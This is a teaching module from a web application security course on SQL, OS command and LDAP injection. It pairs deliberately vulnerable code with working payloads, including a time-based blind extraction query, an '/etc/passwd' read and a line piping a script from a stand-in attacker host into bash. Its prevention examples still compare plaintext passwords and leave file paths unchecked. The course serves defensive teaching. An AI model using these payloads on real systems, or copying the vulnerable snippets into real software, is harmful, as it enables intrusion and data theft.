# Module 2 — Injection Attacks

**Course:** Web Application Security | **Path:** Web App Security (2 of 10)

---

## What You'll Actually Do

You'll exploit SQL injection, command injection, and LDAP injection. Not to break things — to understand how they work so you can prevent them.

---

## SQL Injection

**The vulnerability:**
```python
query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
```

**The attack:**
```text
Email: ' OR '1'='1' --
Password: anything

Resulting query:
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'
-- Comments out the password check
```

**Types:**
```text
In-band (classic): Results visible in the response
Blind (boolean): Response differs based on true/false
Blind (time): Use SLEEP() to infer data
Union-based: Use UNION SELECT to extract data
```

**Time-based blind:**
```text
' OR (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN SLEEP(5) ELSE 0 END FROM users WHERE email='admin@example.com') --
```

---

## OS Command Injection

**The vulnerability:**
```python
import os
filename = request.args.get('file')
os.system(f"cat /var/www/uploads/{filename}")
```

**The attack:**
```text
file=report.pdf; cat /etc/passwd
file=report.pdf && whoami
file=`curl attacker.com/shell.sh | bash`
```

**Chaining:**
```text
; — execute regardless
&& — execute if previous succeeds
|| — execute if previous fails
$() — command substitution
```

---

## LDAP Injection

**The vulnerability:**
```python
filter = f"(&(uid={username})(password={password}))"
```

**The attack:**
```text
Username: *)(uid=*
Password: anything)

Filter: (&(uid=*)(uid=*)(password=anything))
-- Matches any user
```

---

## Prevention

**SQL injection:**
```python
# Parameterized queries
cursor.execute("SELECT * FROM users WHERE email = %s AND password = %s", (email, password))

# ORM
user = User.query.filter_by(email=email, password=password).first()
```

**Command injection:**
```python
# Use subprocess with list (not shell=True)
import subprocess
subprocess.run(["cat", f"/var/www/uploads/{filename}"], check=True)

# Or better: don't use shell commands
import shutil
shutil.copy(f"/var/www/uploads/{filename}", "/tmp/output")
```

---

## Assessment

**Lab task (25 min):**

1. Exploit SQL injection on a test application
2. Extract data using UNION-based injection
3. Use time-based blind injection
4. Exploit OS command injection
5. Write secure code that prevents each

**Grading:**
- SQLi exploited: 25%
- Data extracted: 20%
- Blind injection: 15%
- Command injection exploited: 20%
- Fixes written: 20%

---

## Evidence

- **OutcomeEvidence:** `WAS-LO2 — Injection Attacks`
